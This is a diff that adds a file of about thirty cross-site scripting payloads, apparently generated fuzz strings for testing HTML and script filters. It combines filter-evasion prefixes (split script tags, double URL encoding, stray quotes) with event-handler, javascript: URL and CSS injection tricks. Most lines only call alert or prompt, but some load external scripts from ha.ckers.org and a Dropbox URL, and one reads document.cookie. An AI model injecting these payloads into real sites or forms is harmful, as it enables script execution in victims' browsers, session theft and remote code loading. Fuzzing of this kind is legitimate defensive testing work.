@@ -1,0 +1,30 @@
+<scr<script>ipt><IMG SRC=x onloadedmetadata="alert(String.fromCharCode(88,83,83))"></script //
+\’<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+\"<embed code=%(scriptlet)s></embed></FRAMESET>
+<script><img/src=@&#32;&#13; onerror = prompt('&#49;')</script //
+\’<IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83,83))"></script //
+\’<style>*[{}@import'%(css)s?]</style>X</script>
+%3cscript%3e"`'><script>\x7Ejavascript:alert(1)</script>&gt;>
+'><script><img src=`xx:xx`onerror=alert(1)></FRAMESET>
+&ltscript&gt`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)></FRAMESET>
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">&gt;>
+&ltscript&gt&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'</SCRIPT>
+'; <script>eval(1)</script>
+&ltscript&gt<img src=x onerror=\x10"javascript:alert(1)">
+%253Cscript%253E<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}</iframe>
+%3cscript%3e<svg/onload=alert(1)</iframe>
+\’<SCRIPT SRC=http://ha.ckers.org/xss.js?< B ></iframe>
+<script><style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style></FRAMESET>
+'; <script><a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a></iframe>
+\’`"'><img src='#\x27 onerror=javascript:alert(1)>&gt;>
+%253Cscript%253E'><script>alert(document.cookie);</script></FRAMESET>
+<scr<script>ipt><body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
+<script><IMG%20SRC="jav&#x0D;ascript:alert('WXSS');"></SCRIPT>
+%253Cscript%253E<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE></SCRIPT>
+%253Cscript%253E<script src="/\%(jscript)s"></script>
+\"<input type="text" value=`` <div/onmouseover='alert(1)'>X</div></script>
+%3cscript%3e<frameset onload=javascript:javascript:alert(1)></frameset></FRAMESET>
+'; <script><a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a></iframe>
+%3cscript%3e<IMG SRC=x oncontextmenu="alert(String.fromCharCode(88,83,83))"></iframe>
+<scr<script>ipt><IMG SRC=x onwaiting="alert(String.fromCharCode(88,83,83))">&gt;>
+<script><body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown></script
